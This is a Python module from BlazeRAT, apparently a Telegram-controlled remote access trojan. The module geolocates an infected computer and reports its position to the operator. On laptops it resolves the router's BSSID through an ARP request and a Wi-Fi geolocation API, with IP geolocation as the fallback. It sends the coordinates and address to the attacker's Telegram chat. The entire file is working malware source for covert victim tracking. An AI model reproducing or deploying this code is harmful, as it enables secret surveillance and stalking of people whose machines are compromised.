#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from typing import Union
from requests import get
from core.logger import Log
from netifaces import gateways
from getmac import get_mac_address
from psutil import sensors_battery
from core.messages import services as Messages

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to get geolocation based on BSSID or IP
"""

# Is laptop?
def IsLaptop() -> bool:
    return sensors_battery() is not None


# Get value
def GetValue(data, val) -> str:
    try:
        return data[val]
    except KeyError:
        return "Unknown"

""" Get dafault gateway ip address """
def GetGateway() -> Union[bool, str]:
    try:
        gws = next(iter(GetValue(gateways(), "default").values()))
    except (StopIteration, AttributeError):
        return False
    else:
        return gws[0]

""" Get location based on BSSID address """
def BssidApiRequest(bssid: str) -> Union[bool, dict]:
    # Make request
    try:
        response = get("https://api.mylnikov.org/geolocation/wifi?v=1.2&bssid=" + bssid)
    except Exception as error:
        print(error)
        return False
    else:
        # Parse json
        json = response.json()
        if json["result"] == 200 and response.status_code == 200:
            lat = GetValue(json["data"], "lat")
            lon = GetValue(json["data"], "lon")
            addr = GetValue(json["data"], "location")
            rang = GetValue(json["data"], "range")

            return {
                "latitude": lat,
                "longitude": lon,
                "range": rang,
                "address": addr,
                "text": "Based on BSSID " + bssid
            }
        else:
            return False

""" Get location based in IP address """
def IpApiRequest() -> Union[bool, dict]:
    # Make request
    try:
        response = get("http://www.geoplugin.net/json.gp")
    except Exception as error:
        print(error)
        return False
    else:
        json = response.json()
        if json["geoplugin_status"] == 200 and response.status_code == 200:
            lat = GetValue(json, "geoplugin_latitude")
            lon = GetValue(json, "geoplugin_longitude")
            addr = GetValue(json, "geoplugin_countryName") + ", " + GetValue(json, "geoplugin_city") + ", " + GetValue(json, "geoplugin_regionName")
            rang = GetValue(json, "geoplugin_locationAccuracyRadius")

            return {
                "latitude": float(lat),
                "longitude": float(lon),
                "range": int(rang),
                "address": addr,
                "text": "Based on IP " + GetValue(json, "geoplugin_request")
            }
        else:
            return False

""" Get location by BSSID """
def GetResultBSSID(message, bot) -> Union[bool, dict]:
    chatid = message.chat.id
    # Log
    Log("Location >> Trying get coordinates based on BSSID address", chatid)
    # Detect default gateway ip
    gateway = GetGateway()
    if not gateway:
        bot.send_message(chatid, Messages.location_gateway_detection_failed)
        return False
    # Get gateway mac address
    try:
        bssid = get_mac_address(ip=gateway, network_request=True)
    except Exception as error:
        print(error)
        bot.send_message(chatid, Messages.location_arp_request_failed)
        return False
    # Get BSSID information
    result = BssidApiRequest(bssid)
    if not result:
        bot.send_message(chatid, Messages.location_api_request_failed)
        return False

    return result

""" Get location by IP """
def GetResultIp(message, bot) -> Union[bool, dict]:
    chatid = message.chat.id
    # Log
    Log("Location >> Trying get coordinates based on IP address", chatid)
    result = IpApiRequest()
    if not result:
        bot.send_message(chatid, Messages.location_api_request_failed)
        return False

    return result

""" Send location """
def SendLocation(message, bot) -> None:
    chatid = message.chat.id
    bot.send_chat_action(chatid, "find_location")

    if IsLaptop():
        result = GetResultBSSID(message, bot)
        if not result:
            result = GetResultIp(message, bot)
    else:
        result = GetResultIp(message, bot)

    # Send geolocation
    bot.send_location(chatid, result["latitude"], result["longitude"])
    bot.send_message(chatid,
                     Messages.location_success % (
                         result["latitude"],
                         result["longitude"],
                         result["range"],
                         result["address"],
                         result["text"])
                     )

